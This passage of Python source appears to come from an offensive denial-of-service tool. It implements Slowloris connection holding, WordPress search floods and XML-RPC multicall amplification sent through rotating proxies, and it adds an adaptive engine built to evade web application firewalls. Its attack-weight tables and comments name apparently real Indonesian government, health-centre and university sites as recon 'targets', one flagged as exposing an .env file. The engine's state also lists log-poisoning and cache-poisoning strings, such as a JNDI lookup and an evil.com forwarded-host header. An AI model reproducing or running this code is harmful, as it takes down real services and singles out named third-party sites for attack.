                pass # Suppress Connection Reset errors
            elif "Broken pipe" in err:
                pass # Suppress Broken Pipe
            else:
                # print(f"[DEBUG] SLOW Error: {e}") # Suppress unknown errors too to stay clean
                pass
        Tools.safe_close(s)

    def SLOW_V2(self):
        # [OPTIMIZED] Authentic Slowloris (Partial Headers)
        # Based on gkbrk/slowloris: Send headers but NEVER finish the request.
        # Ideally keeps the socket open forever.
        
        # 1. Partial Payload (No double \r\n at end)
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        path = self.get_random_target_path()
        
        partial_payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"Keep-Alive: {randint(300, 1000)}\r\n"
                           f"Cache-Control: max-age=0\r\n").encode("utf-8")

        s = None
        with suppress(Exception), self.open_connection() as s:
            # Send the partial header
            Tools.send(s, partial_payload)
            
            # Keep-Alive Loop
            for _ in range(self._rpc): # Use RPC as duration multiplier
                # Wait before sending next header tick (Low & Slow)
                sleep(randint(5, 15)) 
                
                try:
                    # Send random header to keep connection alive
                    # But STILL don't close the request body
                    keep = f"X-a: {randint(1, 5000)}\r\n".encode("utf-8")
                    if Tools.send(s, keep):
                        # Success tick
                        pass
                    else:
                        break # Socket died
                except:
                    break
        
        Tools.safe_close(s)

    def WP_SEARCH(self):
        # [UPGRADED] WP DB Stresser with Blacklist & Monitor
        sep = "&" if "?" in self._target.raw_path_qs else "?"
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            
            for _ in range(self._rpc):
                search_query = ProxyTools.Random.rand_str(randint(5, 15))
                full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                payload = (f"GET {full_path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"\r\n").encode("utf-8")
                
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    
                    # Status Sniffer for Blacklist
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    if hasattr(self, '_current_proxy'):
                                        pass  #BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except Exception as e:
                            if "Blocked" in str(e): raise e
                            pass
        except:
            pass
        Tools.safe_close(s)

    def XMLRPC_AMP(self):
        # [OPTIMIZED] XML-RPC Amplification (CPU Killer)
        # Abuses system.multicall to execute hundreds of methods in one request.
        
        # Build Amplification Vector (100x calls)
        calls = ""
        for _ in range(100):
            calls += "<value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member></struct></value>"
            
        xml_payload = (f"<?xml version='1.0' encoding='iso-8859-1'?>"
                       f"<methodCall><methodName>system.multicall</methodName>"
                       f"<params><param><value><array><data>{calls}</data></array></value></param></params>"
                       f"</methodCall>")
        
        # XMLRPC usually lives at /xmlrpc.php
        target_path = self._target.raw_path_qs
        if "xmlrpc" not in target_path:
             target_path = "/xmlrpc.php"

        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)

        post_payload = (f"POST {target_path} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        f"Content-Type: application/xml\r\n"
                        f"Content-Length: {len(xml_payload)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Accept: */*\r\n"
                        f"\r\n"
                        f"{xml_payload}").encode("utf-8")
        
        s = None
        # Use try-except to catch connection issues
        try:
            s = self.open_connection()
            # Increment Global Counter
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            
            for _ in range(self._rpc):
                if Tools.send(s, post_payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(post_payload)
                    if int(REQUESTS_SENT) < 50:
                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Packet Sent to {self._target.authority}")
                    # Simple sniffer
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    if hasattr(self, '_current_proxy'):
                                        pass  #BURNED_PROXIES[self._current_proxy] = time()
                                    break
                        except Exception as e:
                            pass
        except:
            pass
        Tools.safe_close(s)


    # ========================================================================
    #  CHAOS V12 - DEEP TACTICAL AI ENGINE
    #  Phase 1: DEEP RECON     -> Multi-probe target fingerprinting
    #  Phase 2: STRATEGIC PLAN -> WAF/CMS/Server-aware weighted strategy
    #  Phase 3: EXECUTE        -> Precision vector selection with burst control
    #  Phase 4: OBSERVE        -> Response time + status code analysis
    #  Phase 5: ADAPT          -> Reinforcement learning with decay + momentum
    # ========================================================================
    
    # Class-level persistent memory (shared across all thread instances)
    _chaos_intel = {
        "recon_done": False,
        "waf_type": None,         # cloudflare, akamai, imperva, sucuri, wordfence, modsec, fastly, ddosguard, none
        "server_type": None,      # nginx, apache, litespeed, iis, unknown
        "cms_type": None,         # wordpress, joomla, drupal, shopify, laravel, custom
        "has_captcha": False,
        "has_rate_limit": False,
        "response_time_ms": 0,    # Initial probe response time
        "target_alive": True,     # False when target stops responding (5xx)
        "consecutive_5xx": 0,     # Track server overload signals
        "consecutive_block": 0,   # Track consecutive 403/429 blocks
        "success_history": {},    # method_name -> [recent_results] (sliding window)
        "total_executions": 0,    # Total CHAOS calls for phase transitions
        "phase": "PROBE",         # PROBE -> CALIBRATE -> ASSAULT -> SUSTAIN -> FINISH
        "best_method": None,      # Dynamically tracked top performer
        "worst_method": None,     # Dynamically tracked worst performer
        "endpoints_discovered": [],  # Heavy endpoints found during multi-probe
        "burst_counter": 0,       # For burst/pause rhythm
        "last_method": None,      # Previous method for anti-pattern
        "last_3_methods": [],     # Sliding window of last 3 methods (anti-fingerprint)
        "combo_queue": [],        # Pre-planned combo attack sequence
        "emergency_evasion": False,  # Triggered when WAF is actively hunting us
        "target_weakpoint": None,   # Discovered weak method that causes most damage
        "efficiency_score": {},    # method -> (successes / total_attempts) ratio
        "attack_start_time": 0,    # When the attack started (for time-based phases)
        "last_health_check": 0,    # Timestamp of last target health pulse
        "health_history": [],      # Response time trend [ms, ms, ms...]
        "target_getting_weaker": False,  # True when response times are increasing
        "target_is_down": False,   # True when target stops responding
        "waf_adapting": False,     # True when WAF seems to be learning our pattern
        "blocks_per_minute": [],   # Track block rate over time windows
        "last_block_window_time": 0,
        "decoy_interval": 0,       # Counter for decoy traffic injection
        "methods_tried_count": {},  # Total attempts per method for exploration score
        "exploration_bonus": True,  # Allow exploration of untried methods early on
        "temperature": 0.3,        # Aggression temperature (0.0=stealth, 1.0=full rage)
        "wave_state": "RISE",      # RISE -> PEAK -> FALL -> REST (wave attack pattern)
        "wave_tick": 0,            # Counter for wave timing
        "path_method_scores": {},  # endpoint_path -> {method: score}  (path-method affinity)
        "saved_to_disk": False,    # Whether intel has been persisted
        "session_journey": [],     # Simulated user navigation path stack
        "referer_chain": [],       # Realistic referer header chain
        "cached_paths": [],        # Paths that returned cache-hit (useless to attack)
        "uncached_paths": [],      # Paths that bypass cache (valuable targets)
        "content_type_rotation": 0, # Rotate POST content types
        "harvested_cookies": {},   # Cookies collected from target responses
        "waf_block_signatures": [],# Detected WAF block page keywords
        "waf_rules_triggered": [], # Specific WAF rules we are triggering
        "adaptive_rpc": 10,        # Dynamic requests-per-connection (auto-tuned)
        "jitter_ms": 0,            # Current timing jitter between requests
        "successful_streak": 0,    # Consecutive successful requests
        "method_timing": {},       # method -> avg execution time in ms
        "damage_score": 0,         # Estimated total damage dealt to target
        "generation": 0,           # Genetic algorithm generation counter
        "gene_pool": [],           # Top-performing weight sets (DNA)
        "current_dna": None,       # Active weight set being tested
        "dna_score": 0,            # Fitness score for current DNA
        "rate_limit_threshold": None, # Discovered requests/sec limit
        "rate_limit_probed": False,
        "multi_path_queue": [],    # Queue of (path, method) pairs for multi-targeting
        "encoding_rotation": 0,    # Payload encoding variant counter
        "path_scores": {},         # path -> success_rate for path targeting
        "kill_chain_phase": "RECON",  # RECON->PROBE->WEAKEN->BREACH->OVERWHELM->SUSTAIN_KILL
        "kill_chain_objective": "",    # Current phase objective description
        "predicted_ttd": None,        # Time-To-Down prediction in seconds
        "latency_trend_slope": 0,     # Positive = target weakening, Negative = recovering
        "recovery_detected": False,   # True when target starts recovering
        "recovery_counter": 0,        # How many times target recovered
        "proxy_method_affinity": {},  # proxy_addr -> {method: success_rate}
        "best_proxy_for_method": {},  # method -> [top proxy addrs]
        "http_methods_pool": ["GET", "POST", "HEAD", "OPTIONS", "PATCH"],
        "method_diversity_score": 0,  # How many unique methods used recently
        "backend_lang": None,      # php, nodejs, java, python, aspnet, ruby, go, unknown
        "backend_framework": None, # laravel, django, spring, express, rails, flask, etc
        "resource_target": "auto", # cpu, memory, database, io, connection, auto
        "infra_map": {},           # Full infrastructure fingerprint
        "time_intensity": 1.0,     # Time-of-day intensity multiplier
        "last_intensity_check": 0,
        "attack_log": [],          # Condensed log of key events for learning
        "methods_per_minute": [],  # Track method variety over time
        "cognitive_state": "LEARNING", # LEARNING -> EXPLOITING -> ADAPTING -> MASTERING
        "briefing_shown": False,   # Whether pre-attack briefing was displayed
        "method_streaks": {},      # method -> current consecutive success count
        "hot_streak_method": None, # Method on a hot streak (5+ consecutive wins)
        "total_requests_by_method": {},  # method -> total requests sent
        "peak_damage": 0,         # Maximum damage score achieved
        "peak_rps": 0,            # Peak requests per second observed
        "strategy_switches": 0,   # How many times strategy was fundamentally changed
        "last_chosen_method": None,# For diversity tracking
        "method_diversity_window": [],  # Last 20 methods chosen for diversity score
        "swarm_pulse_time": 0,    # Timestamp for synchronized multi-thread strikes
        "pulse_count": 0,         # Tracking how many swarm pulses executed
        "proxy_health_purged": 0, # Count of dead proxies auto-purged by AI
        "utm_rotation": 0,        # Tracker for query fuzzing
        "geo_routing": None,      # Target geographical routing node (e.g. cloudflare colo)
        "battering_ram": None,    # A specialized highly-evasive payload structure
        "anomaly_score": 0,       # Track how "abnormal" the WAF thinks our traffic is
        "stealth_cooldown": 0,    # Cooldown timer to force stealth after heavy detection
        "ml_model": {"success": 1, "total": 2, "features": {}},    # Miniature Naive Bayes predictive model
        "ml_predictions_enabled": False, # Activates when enough data collected
        "bandwidth_kb": 0.0,      # Estimated bandwidth (Megabytes) forced from target
        "wasted_server_cpu": 0,   # Estimated CPU cycles wasted by our attack
        "q_table": {},            # Reinforcement Learning State-Action Space
        "q_learning_rate": 0.1,   # Alpha: How quickly it learns new patterns
        "q_discount_factor": 0.9, # Gamma: Importance of future rewards
        "q_epsilon": 0.4,         # Epsilon: Exploration rate (decays over time)
        "current_state": "PROBE", # Simplified state for RL tracking
        "playwright_active": False, # Is our headless browser JS-engine active?
        "js_challenges_passed": 0,  # Count of Cloudflare JS challenges solved
        "browser_pool": [],       # Pool of real headless browser sessions passing tokens
        "cookie_dispenser_port": 5005, # Port for the local turnstile/cookie dispenser API
        "shadow_protocol_active": False,  # Is the ultimate shadow evasion protocol running?
        "botnet_nodes_simulated": 0,      # Number of distinct IPs we are mimicking
        "asn_diversity_score": 0,         # Autonomous System Number diversity of proxies
        "fingerprint_pool": [],           # Complete JA3 + HTTP/2 + Header fingerprints
        "zero_day_mutations_sent": 0,     # Tracking complex DPI-breaking payloads
        "geo_edge_nodo": "UNKNOWN",       # The specific WAF Edge server handling us
        "psy_ops_active": False,          # Corrupting logs with weird HTTP standards
        "log_poisoning_payloads": [       # Random fake vulnerability strings to distract WAF
            "' OR '1'='1", "1; DROP TABLE users", "../../../etc/passwd",
            "<script>alert(1)</script>", "${jndi:ldap://fake.server/Exploit}"
        ],
        "gti_loaded": False,              # Global Threat Intelligence db loaded
        "honeypot_detected": False,       # Has the WAF router trapped us?
        "adaptive_threads": 500,          # Self-scaling thread boundaries
        "gti_match_score": 0,             # How similar this target is to past conquests
        "wp_cron_available": False,        # Is wp-cron.php open? (puskesjaten1: YES, 0-byte 96ms)
        "login_endpoint": None,            # Discovered login form endpoint (konisolo: /login 229ms)
        "page_weight_bytes": 0,            # Baseline page size in bytes (hardosoloplast: 273KB!)
        "decoy_traffic_ratio": 0.15,       # % of traffic that looks like normal browsing
        "smart_decoy_paths": [],           # Paths used for legitimate-looking decoy traffic
        "waf_evasion_score": 0,            # How many WAF checks we are currently evading
        "attack_vector_diversity": 0,      # Number of distinct attack vectors in use
        "session_exhaustion_count": 0,     # Unique sessions created to exhaust server session storage
        "slowloris_slots": 0,              # Active slowloris-style connections being held open
        "request_smuggling_active": False,  # HTTP Request Smuggling attempted
        "genetic_payload_gen": 0,           # Genetic Algorithm generation for payload evolution
        "entropy_score": 0.0,              # Shannon entropy of traffic pattern (higher = more random)
        "response_body_intel": {},          # Keywords found in response bodies (error messages etc)
        "server_error_patterns": [],        # Specific error messages leaked by servers
        "timing_side_channel": {},          # method -> avg_response_ms mapping for side-channel
        "target_thread_pool_est": 0,       # Estimated max threads on the target server
        "consecutive_success": 0,          # Current unbroken success streak
        "misfire_budget": 100,             # How many failures we tolerate before strategy change
        "multi_vector_active": False,     # Are we launching orthogonal attacks simultaneously?
        "topology_mesh": {                # Deep map of discovered backend microservices
            "auth_endpoints": [],
            "api_endpoints": [],
            "static_assets": [],
            "websockets": []
        },
        "battering_ram_method": None,     # Track what method is currently used as the ReDos battering ram
        "quantum_state_active": False,    # True if we are continuously switching IP-Subnets to confuse rate limiters
        "neural_synapses": {},            # Advanced markov-chain logic for attack pattern transitions
        "dead_drop_dns": False,           # Resolving target IP through alternative root DNS to bypass edge cache
        "cache_poisoning_payloads": [     # Strings injected to poison edge caches for legitimate users
            "?cb=123", "&_cache_bust=x", "X-Forwarded-Host: evil.com", "X-Original-URL: /admin"
        ],
        "poisoned_cache_hits": 0,         # Successful cache destruction attempts
        "siege_phase": "RECON",           # RECON -> SOFTEN -> BREACH -> SUSTAIN -> PILLAGE
        "siege_doctrine": {},             # Tactical plan generated per siege phase
        "h2_rapid_reset_count": 0,        # HTTP/2 RST_STREAM rapid reset attacks fired
        "dns_rebind_active": False,       # DNS Rebinding attack vector active
        "circadian_profile": "DAYTIME",   # DAYTIME / NIGHTTIME / PEAK_HOUR traffic mimicry
        "aar_written": False,             # After-Action Report generated flag
        "total_attack_duration_sec": 0,   # Elapsed seconds since attack began
        "estimated_financial_damage_usd": 0.0, # Estimated $ cost inflicted on target hosting
        "waf_fingerprint_hash": "",       # Unique fingerprint of the WAF config we're facing
        "payload_entropy_score": 0.0,     # Shannon entropy of our payload randomness
        "connection_pool_pressure": 0,    # Estimated % of target's connection pool we're consuming
        "origin_ip_candidates": [],       # Potential real origin IPs behind CDN
        "ssl_cert_cn": "",                # Common Name from target's SSL certificate
        "response_header_fingerprint": {},# Full map of response headers for fingerprinting
        "attack_phases_completed": [],    # History of completed attack phases
    }
    
    # ========================================================================
    #  RESOURCE ATTACK PROFILES: Which methods target which server resource
    # ========================================================================
    _RESOURCE_TARGETS = {
        "cpu":        {"STRESS": 50, "PPS": 40, "POST_DYN": 35, "WP_SEARCH": 45},
        "memory":     {"SLOW_V2": 60, "GET": 30, "DYN": 35, "COOKIE": 25},
        "database":   {"WP_SEARCH": 80, "XMLRPC_AMP": 70, "POST_DYN": 50, "DYN": 40},
        "io":         {"POST_DYN": 45, "POST": 40, "STRESS": 30, "DYN": 35},
        "connection": {"SLOW_V2": 70, "GET": 35, "COOKIE": 30, "BOT": 25},
    }
    
    # ========================================================================
    #  BACKEND VULNERABILITY MAP: Known weaknesses per backend technology
    # ========================================================================
    _BACKEND_WEAKNESSES = {
        "php":     {"resource": "cpu",     "methods": {"WP_SEARCH": 70, "POST_DYN": 50, "XMLRPC_AMP": 65}},
        "nodejs":  {"resource": "memory",  "methods": {"SLOW_V2": 60, "POST_DYN": 45, "DYN": 40}},
        "java":    {"resource": "memory",  "methods": {"SLOW_V2": 55, "POST_DYN": 50, "STRESS": 35}},
        "python":  {"resource": "cpu",     "methods": {"POST_DYN": 55, "STRESS": 45, "DYN": 40}},
        "aspnet":  {"resource": "memory",  "methods": {"SLOW_V2": 50, "POST_DYN": 45, "STRESS": 40}},
        "ruby":    {"resource": "cpu",     "methods": {"STRESS": 50, "POST_DYN": 45, "DYN": 40}},
        "go":      {"resource": "connection", "methods": {"SLOW_V2": 55, "PPS": 45, "STRESS": 40}},
    }
    
    # ========================================================================
    #  EXPERIENCE DATABASE: Pre-coded knowledge from real-world attack patterns
    #  Format: (waf, server, cms) -> {method: bonus_weight}
    #  This is "muscle memory" - things a veteran attacker would know instantly
    # ========================================================================
    _EXPERIENCE_DB = {
        # WordPress on Apache without WAF = XMLRPC is devastating
        ("none", "apache", "wordpress"):      {"XMLRPC_AMP": 90, "WP_SEARCH": 80, "STRESS": 40},
        ("none", "nginx", "wordpress"):       {"XMLRPC_AMP": 85, "WP_SEARCH": 75, "POST_DYN": 35},
        ("none", "litespeed", "wordpress"):   {"WP_SEARCH": 70, "POST_DYN": 40, "DYN": 35},
        # WordPress behind Cloudflare = Stealth + WP exploits
        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        ("cloudflare", "apache", "wordpress"):{"STEALTH_JA3": 75, "WP_SEARCH": 55, "XMLRPC_AMP": 45},
        # WordPress behind Wordfence = its own WAF is the weakness
        ("wordfence", "apache", "wordpress"): {"WP_SEARCH": 90, "XMLRPC_AMP": 85, "POST_DYN": 40},
        ("wordfence", "nginx", "wordpress"):  {"WP_SEARCH": 85, "XMLRPC_AMP": 80, "POST_DYN": 35},
        # Naked servers (no CMS, no WAF) = brute force wins
        ("none", "nginx", "custom"):          {"STRESS": 50, "PPS": 40, "GET": 35, "POST_DYN": 30},
        ("none", "apache", "custom"):         {"STRESS": 45, "PPS": 35, "POST_DYN": 35},
        ("none", "litespeed", "custom"):      {"POST_DYN": 40, "DYN": 35, "STRESS": 30},
        ("none", "iis", "custom"):            {"SLOW_V2": 50, "STRESS": 40, "POST_DYN": 35},
        # Akamai targets = only stealth works
        ("akamai", "unknown", "custom"):      {"STEALTH_JA3": 90, "SLOW_V2": 40},
        ("akamai", "nginx", "custom"):        {"STEALTH_JA3": 85, "SLOW_V2": 35, "POST_DYN": 20},
        # Shopify = CDN-heavy, need to exhaust origin
        ("cloudflare", "nginx", "shopify"):   {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 25},
        # Laravel apps = POST-heavy endpoints
        ("none", "nginx", "laravel"):         {"POST_DYN": 60, "POST": 45, "DYN": 40},
        ("cloudflare", "nginx", "laravel"):   {"STEALTH_JA3": 70, "POST_DYN": 45, "DYN": 30},
        # Joomla targets
        ("none", "apache", "joomla"):         {"POST_DYN": 50, "DYN": 45, "STRESS": 30},
        # Drupal targets
        ("none", "apache", "drupal"):         {"POST_DYN": 50, "DYN": 40, "POST": 35},
        # ===== REAL-WORLD SCENARIOS LEARNED FROM FIELD EXPERIENCE =====
        # --- Government / Institution sites (usually Apache + no WAF + old CMS) ---
        ("none", "apache", "custom"):         {"SLOW_V2": 45, "STRESS": 40, "POST_DYN": 35, "PPS": 30},
        ("none", "unknown", "custom"):        {"STRESS": 40, "POST_DYN": 35, "PPS": 30, "GET": 30},
        # --- E-commerce heavy (Magento/OpenCart on Nginx/LiteSpeed) ---
        ("none", "nginx", "custom"):          {"POST_DYN": 50, "DYN": 45, "STRESS": 35, "PPS": 30},
        ("none", "litespeed", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30},
        # --- CloudFlare Free Tier (most common protection) ---
        ("cloudflare", "unknown", "custom"):  {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 25, "BOT": 15},
        ("cloudflare", "unknown", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 55, "XMLRPC_AMP": 45, "SLOW_V2": 20},
        ("cloudflare", "litespeed", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 60, "POST_DYN": 30},
        ("cloudflare", "cloudflare", "custom"):{"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 20},
        # --- Sucuri + WordPress (very common combo for mid-size sites) ---
        ("sucuri", "apache", "wordpress"):    {"STEALTH_JA3": 55, "WP_SEARCH": 65, "XMLRPC_AMP": 60, "DYN": 25},
        ("sucuri", "nginx", "wordpress"):     {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 55, "POST_DYN": 30},
        ("sucuri", "unknown", "wordpress"):   {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        ("sucuri", "apache", "custom"):       {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
        ("sucuri", "nginx", "custom"):        {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
        # --- Imperva / Incapsula (enterprise sites, banks, large e-commerce) ---
        ("imperva", "nginx", "custom"):       {"STEALTH_JA3": 65, "COOKIE": 35, "SLOW_V2": 30, "POST_DYN": 20},
        ("imperva", "apache", "custom"):      {"STEALTH_JA3": 60, "COOKIE": 35, "SLOW_V2": 25},
        ("imperva", "unknown", "custom"):     {"STEALTH_JA3": 65, "COOKIE": 30, "SLOW_V2": 25},
        # --- DDoS-Guard (Russian sites, gaming, crypto) ---
        ("ddosguard", "nginx", "custom"):     {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15},
        ("ddosguard", "unknown", "custom"):   {"STEALTH_JA3": 75, "SLOW_V2": 35},
        # --- Fastly CDN (media sites, SaaS platforms) ---
        ("fastly", "nginx", "custom"):        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25},
        ("fastly", "unknown", "custom"):      {"STEALTH_JA3": 60, "POST_DYN": 30},
        # --- AWS WAF (SaaS, startups, API backends) ---
        ("aws_waf", "nginx", "custom"):       {"STEALTH_JA3": 70, "POST_DYN": 35, "DYN": 25, "COOKIE": 15},
        ("aws_waf", "unknown", "custom"):     {"STEALTH_JA3": 65, "POST_DYN": 30, "COOKIE": 20},
        ("aws_waf", "nginx", "laravel"):      {"STEALTH_JA3": 65, "POST_DYN": 50, "POST": 35},
        ("aws_waf", "nginx", "nextjs"):       {"STEALTH_JA3": 70, "POST_DYN": 40, "DYN": 30},
        # --- StackPath (smaller CDN, hosting providers) ---
        ("stackpath", "nginx", "custom"):     {"STEALTH_JA3": 60, "POST_DYN": 35, "SLOW_V2": 25},
        ("stackpath", "apache", "wordpress"): {"STEALTH_JA3": 55, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        # ===================================================================
        # REAL-WORLD FIELD DATA: Indonesian Government & Corporate Targets
        # Trained from live recon: konisolo.com, puskesjaten1, hardosoloplast, surakarta.go.id
        # ===================================================================
        # --- LiteSpeed + Laravel (konisolo.com pattern: PHP 8.2, no CDN, XSRF-TOKEN) ---
        ("none", "litespeed", "laravel"):     {"POST_DYN": 80, "STRESS": 55, "SLOW_V2": 45, "DYN": 40, "PPS": 35},
        ("none", "litespeed", "custom"):      {"POST_DYN": 70, "STRESS": 50, "DYN": 45, "SLOW_V2": 40},
        # --- Nginx + WordPress bare (puskesjaten1 pattern: no WAF, wp-json exposed) ---
        ("none", "nginx", "wordpress"):       {"XMLRPC_AMP": 90, "WP_SEARCH": 85, "POST_DYN": 50, "SLOW_V2": 40, "DYN": 35},
        # --- LiteSpeed + WordPress + LSCache (hardosoloplast pattern: Vary:User-Agent) ---
        ("none", "litespeed", "wordpress"):   {"WP_SEARCH": 85, "XMLRPC_AMP": 75, "POST_DYN": 55, "DYN": 40, "STRESS": 35},
        # --- Apache + Laravel + Rate-Limit (surakarta.go.id: X-RateLimit-Limit:200, HSTS, CSP) ---
        ("none", "apache", "laravel"):        {"POST_DYN": 75, "SLOW_V2": 60, "STEALTH_JA3": 55, "DYN": 45, "COOKIE": 30},
        # --- Generic .go.id government pattern (Apache, old PHP, minimal WAF) ---
        ("none", "apache", "government"):     {"SLOW_V2": 65, "POST_DYN": 55, "STRESS": 45, "WP_SEARCH": 40, "GET": 30},
        ("none", "nginx", "government"):      {"POST_DYN": 60, "SLOW_V2": 55, "STRESS": 40, "DYN": 35},
        # --- LiteSpeed + Cloudflare (common Indonesian hosting combo) ---
        ("cloudflare", "litespeed", "laravel"): {"STEALTH_JA3": 80, "POST_DYN": 50, "SLOW_V2": 35, "DYN": 25},
        ("cloudflare", "litespeed", "custom"):  {"STEALTH_JA3": 75, "POST_DYN": 45, "DYN": 30},
        # --- Apache + Cloudflare + Laravel (enterprise .go.id behind CDN) ---
        ("cloudflare", "apache", "laravel"):  {"STEALTH_JA3": 75, "POST_DYN": 55, "SLOW_V2": 40, "COOKIE": 25},
        # --- Wordfence + Cloudflare Double Protection ---
        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        # --- IIS Servers (Corporate / Government / Legacy .NET Apps) ---
        ("none", "iis", "custom"):            {"SLOW_V2": 55, "STRESS": 45, "POST_DYN": 35, "PPS": 25},
        ("aws_waf", "iis", "custom"):         {"STEALTH_JA3": 60, "SLOW_V2": 40, "POST_DYN": 30},
        # --- OpenResty (API Gateways, Kong, custom Lua WAFs) ---
        ("none", "openresty", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30, "SLOW_V2": 25},
        ("cloudflare", "openresty", "custom"):{"STEALTH_JA3": 70, "POST_DYN": 30, "SLOW_V2": 25},
        # --- NextJS / React SSR (Modern web apps, Vercel) ---
        ("none", "nginx", "nextjs"):          {"POST_DYN": 50, "DYN": 40, "POST": 35, "STRESS": 25},
        ("cloudflare", "nginx", "nextjs"):    {"STEALTH_JA3": 65, "POST_DYN": 35, "DYN": 25},
        ("none", "unknown", "nextjs"):        {"POST_DYN": 45, "DYN": 40, "POST": 30},
        # ===================================================================
        # REAL-WORLD FIELD DATA Batch 2: University & Government Portals
        # Trained from: raynaldotech.my.id, satudata.karanganyarkab.go.id, uns.ac.id, ums.ac.id
        # ===================================================================
        # --- Next.js + Vercel + Cloudflare (raynaldotech.my.id: VERY STRICT, rapid-fire=403) ---
        ("cloudflare", "cloudflare", "nextjs"):  {"STEALTH_JA3": 95, "SLOW_V2": 30, "COOKIE": 15},
        ("cloudflare", "unknown", "nextjs"):     {"STEALTH_JA3": 90, "SLOW_V2": 25, "POST_DYN": 15},
        # --- CodeIgniter + Caddy Reverse Proxy (satudata: ci_session, no WAF, 140ms) ---
        ("none", "unknown", "codeigniter"):      {"POST_DYN": 80, "STRESS": 60, "SLOW_V2": 50, "DYN": 45, "PPS": 35},
        ("none", "caddy", "codeigniter"):        {"POST_DYN": 75, "STRESS": 55, "SLOW_V2": 50, "DYN": 40},
        ("none", "caddy", "custom"):             {"POST_DYN": 65, "STRESS": 50, "SLOW_V2": 45, "DYN": 40},
        # --- WordPress Headless/REST API Only (uns.ac.id: wp-json open, .env EXPOSED!, no WAF) ---
        ("none", "unknown", "wordpress"):        {"XMLRPC_AMP": 90, "WP_SEARCH": 80, "POST_DYN": 60, "DYN": 45, "STRESS": 40},
        # --- Nuxt.js + Cloudflare + Google Cloud (ums.ac.id: 432KB page, s-maxage=600) ---
        ("cloudflare", "cloudflare", "nuxtjs"):  {"STEALTH_JA3": 85, "SLOW_V2": 40, "POST_DYN": 30, "DYN": 25},
        ("cloudflare", "unknown", "nuxtjs"):     {"STEALTH_JA3": 80, "POST_DYN": 35, "SLOW_V2": 30},
        # --- University .ac.id pattern (often old WordPress, mixed CDN, weak security headers) ---
        ("none", "unknown", "university"):       {"WP_SEARCH": 70, "POST_DYN": 60, "STRESS": 50, "SLOW_V2": 45, "DYN": 40},
        ("cloudflare", "unknown", "university"): {"STEALTH_JA3": 80, "SLOW_V2": 35, "POST_DYN": 30},
    }
    
    # ========================================================================
    #  COMBO CHAINS: Pre-planned multi-step attack sequences
    #  Instead of random picks, execute coordinated multi-vector strikes
    # ========================================================================
    _COMBO_CHAINS = {
        "stealth_burst":    ["STEALTH_JA3", "STEALTH_JA3", "POST_DYN", "DYN", "STEALTH_JA3"],
        "wp_annihilator":   ["WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "WP_SEARCH"],
        "slow_siege":       ["SLOW_V2", "SLOW_V2", "SLOW_V2", "BOT", "SLOW_V2"],
        "blitz_krieg":      ["STRESS", "PPS", "GET", "POST", "STRESS", "PPS"],
        "polymorphic_wave": ["POST_DYN", "DYN", "STEALTH_JA3", "POST", "GET", "POST_DYN"],
        "cookie_monster":   ["COOKIE", "STEALTH_JA3", "POST_DYN", "COOKIE", "DYN"],
        "bot_swarm":        ["BOT", "GET", "BOT", "STEALTH_JA3", "BOT"],
        "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
        # --- V32: Real-World Trained Combo Chains ---
        # Trained from konisolo.com (LiteSpeed+Laravel: POST_DYN hammers Eloquent ORM)
        "laravel_breaker":  ["POST_DYN", "STRESS", "POST_DYN", "DYN", "POST_DYN", "SLOW_V2"],
        # Trained from puskesjaten1 (Nginx+WP bare: total WP annihilation without restraint)
